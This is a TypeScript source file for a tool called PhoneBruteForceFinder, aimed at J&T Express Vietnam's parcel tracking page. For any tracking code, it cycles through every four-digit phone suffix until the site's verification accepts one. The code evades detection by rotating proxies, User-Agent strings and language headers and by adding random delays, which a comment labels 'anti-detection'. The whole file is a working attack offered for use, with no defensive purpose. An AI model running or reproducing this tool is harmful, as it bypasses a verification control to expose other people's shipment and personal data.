import axios, { AxiosInstance } from "axios";
import { HttpProxyAgent } from 'http-proxy-agent';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { proxyManager } from "../proxy";

interface AxiosRequestConfig {
  params?: {
    type: string;
    billcode: string;
    cellphone: string;
  };
  timeout?: number;
  validateStatus?: () => boolean;
  headers?: Record<string, string>;
  httpAgent?: HttpProxyAgent<any>;
  httpsAgent?: HttpsProxyAgent<any>;
}

export class PhoneBruteForceFinder {
  private baseUrl: string = 'https://jtexpress.vn/vi/tracking';
  private currentProxyIndex: number;
  private attemptCount: number;
  private userAgents: string[];
  private languages: string[];
  private headers: Record<string, string>;
  private client: AxiosInstance;
  private onProgressCallback?: (attemptCount: number) => Promise<void>;

  constructor(onProgressCallback?: (attemptCount: number) => Promise<void>, initialAttemptCount: number = 0) {
    this.currentProxyIndex = 0;
    this.attemptCount = initialAttemptCount;
    this.onProgressCallback = onProgressCallback;

    // User-Agent rotation list
    this.userAgents = [
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
    ];

    // Accept-Language rotation
    this.languages = [
      'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,vi;q=0.6',
      'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
      'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
      'en-US,en;q=0.9,vi;q=0.8,zh-CN;q=0.7'
    ];

    this.headers = {
      'Accept': '*/*',
      'Accept-Language': this.getRandomLanguage(),
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://jtexpress.vn',
      'Pragma': 'no-cache',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': this.getRandomUserAgent(),
      'X-OCTOBER-REQUEST-HANDLER': 'onSearchPriceList',
      'X-OCTOBER-REQUEST-PARTIALS': 'search/pricelist/result-list-search',
      'X-Requested-With': 'XMLHttpRequest',
      'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': this.getRandomPlatform()
    };

    this.client = axios.create({
      headers: this.headers,
      timeout: 10000,
      validateStatus: () => true
    });
  }

  /**
   * Get random User-Agent
   */
  getRandomUserAgent(): string {
    return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
  }

  /**
   * Get random Accept-Language
   */
  getRandomLanguage(): string {
    return this.languages[Math.floor(Math.random() * this.languages.length)];
  }

  /**
   * Get random platform
   */
  getRandomPlatform(): string {
    const platforms = ['"macOS"', '"Windows"', '"Linux"'];
    return platforms[Math.floor(Math.random() * platforms.length)];
  }

  /**
   * Get random delay with fixed range (2000-3000ms for anti-detection)
   * @returns {number} Random delay between 2000-3000ms
   */
  getRandomDelay(): number {
    const min = 2000;
    const max = 3000;
    return Math.floor(Math.random() * (max - min) + min);
  }
  /**
   * Get next proxy in rotation
   * @returns {Object|null} Proxy config or null if no proxies
   */
  getNextProxy() {
    const proxies = proxyManager.getAllProxies();

    const proxy = proxies[this.currentProxyIndex];
    this.currentProxyIndex = (this.currentProxyIndex + 1) % proxies.length;

    // Parse proxy URL (format: http://ip:port)
    const url = new URL(proxy.server);

    return {
      protocol: url.protocol.replace(':', ''),
      hostname: url.hostname,
      port: Number.parseInt(url.port, 10),
      auth: {
        username: proxy.username || '',
        password: proxy.password || ''
      }
    };
  }

  /**
   * Check if a phone number is valid for a tracking code
   * by making a request to the API
   * @param {string} billcode - Tracking number
   * @param {string} cellphone - Last 4 digits
   * @returns {Promise<Object>} Response details
   */
  async checkPhoneValidity(billcode: string, cellphone: string): Promise<{
    status: number | string;
    isValid: boolean;
    error?: string;
  }> {
    try {

      // Get next proxy if available
      const proxy = this.getNextProxy();
      const requestConfig: AxiosRequestConfig = {
        params: { type: 'track', billcode, cellphone },
        timeout: 15000,
        validateStatus: () => true,
        headers: {
          'User-Agent': this.getRandomUserAgent(),
          'Accept-Language': this.getRandomLanguage(),
          'sec-ch-ua-platform': this.getRandomPlatform()
        }
      };

      // Add proxy to request if available
      if (proxy) {
        const proxyUrl = `http://${proxy.auth.username}:${proxy.auth.password}@${proxy.hostname}:${proxy.port}`;

        requestConfig.httpAgent = new HttpProxyAgent(proxyUrl);
        requestConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
      }

      const response = await this.client.get(
        this.baseUrl,
        requestConfig
      );

      // Check if response contains error message about not finding data
      // Invalid: contains "Không tìm thấy dữ liệu về vận đơn..."
      // Valid: doesn't contain error message and status 200
      const hasError = JSON.stringify(response.data)?.includes('Không tìm thấy dữ liệu về vận đơn');

      if (!hasError && response.status === 200) {
        console.log(`   ✅ ${cellphone} - Valid`);
        return {
          status: 'success',
          isValid: true
        };
      }

      return {
        status: 'error',
        isValid: !hasError && response.status === 200,
      };
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      const errorCode = error instanceof Error && 'code' in error ? (error as any).code : undefined;
      console.log(`   ⚠️  ${cellphone} - Error: ${errorCode || errorMessage}`);
      return {
        status: 'error',
        isValid: false,
        error: errorMessage
      };
    }
  }

  /**
   * Check validity of provided phone numbers
   * @param billcode - Tracking code
   * @param phones - List of phone numbers to check
   * @returns Set of valid phone numbers
   */
  private async checkProvidedPhones(billcode: string, phones: string[]): Promise<Set<string>> {
    const validPhonesSet = new Set<string>();

    for (const phone of phones) {
      const lastFourDigits = String(phone).padStart(4, '0');
      const result = await this.checkPhoneValidity(billcode, lastFourDigits);

      if (result.isValid) {
        validPhonesSet.add(lastFourDigits);
      }

      await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));
    }

    return validPhonesSet;
  }

  /**
   * Brute force search for valid phone numbers
   * @param billcode - Tracking code
   * @param startFrom - Starting number for brute force
   * @param maxAttempts - Maximum attempts to try
   * @returns Set of valid phone numbers found
   */
  private async bruteForcePhones(
    billcode: string,
    startFrom: number,
    maxAttempts: number
  ): Promise<Set<string>> {
    const validPhonesSet = new Set<string>();

    // Update progress callback immediately at start
    if (this.onProgressCallback) {
      try {
        await this.onProgressCallback(this.attemptCount);
      } catch (error) {
        console.error(`⚠️ [BRUTE FORCE] Failed to update progress:`, error);
      }
    }

    for (let i = startFrom; i < maxAttempts; i++) {
      const lastFourDigits = String(i).padStart(4, '0');
      const result = await this.checkPhoneValidity(billcode, lastFourDigits);

      if (result.isValid) {
        validPhonesSet.add(lastFourDigits);
        // Return immediately on first valid match
        return validPhonesSet;
      }

      this.attemptCount++;
      await this.logBruteForceProgress();

      await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));
    }

    return validPhonesSet;
  }

  /**
   * Log progress during brute force search
   * Also calls progress callback to update database in real-time
   */
  private async logBruteForceProgress(): Promise<void> {
    // Update every 20 attempts for more real-time feedback
    if (this.attemptCount % 20 === 0) {
      console.log(`   ⏱️  Attempted ${this.attemptCount} combinations...`);
      
      // Update database with current progress
      if (this.onProgressCallback) {
        try {
          await this.onProgressCallback(this.attemptCount);
        } catch (error) {
          console.error(`⚠️ [BRUTE FORCE] Failed to update progress:`, error);
        }
      }
    }
  }

  /**
   * Log results of phone search
   */
  private logSearchResults(billcode: string, validPhones: Set<string>): void {
    if (validPhones.size > 0) {
      console.log(`✅ Valid phones for ${billcode}: ${Array.from(validPhones).join(', ')}`);
    }
  }

  /**
    * Main function to find valid phone numbers for a given tracking code
    * @returns {Promise<Object>} Result with valid phones and attempt count
   */
  async findPhone(
    billcode: string,
    phones: string[],
    startFrom: number = 0,
    maxAttempts: number = 10000
  ): Promise<{
    status: string;
    billcode: string;
    validPhones: string;
    attemptCount: number;
  }> {
    let validPhonesSet: Set<string>;

    if (startFrom === 0) {
      console.log(`🔍 Starting phone scan for billcode: ${billcode} with provided phones...`);
      validPhonesSet = await this.checkProvidedPhones(billcode, phones);
      if (validPhonesSet.size  === 0) {
        console.log(`   🔍 No valid phones found in provided list, starting brute-force search...`);
        validPhonesSet = await this.bruteForcePhones(billcode, startFrom, maxAttempts);
      }
    } else {
      validPhonesSet = await this.bruteForcePhones(billcode, startFrom, maxAttempts);
    }

    this.logSearchResults(billcode, validPhonesSet);

    return {
      status: 'success',
      billcode: billcode,
      validPhones: Array.from(validPhonesSet).join(', '),
      attemptCount: this.attemptCount
    };
  }
}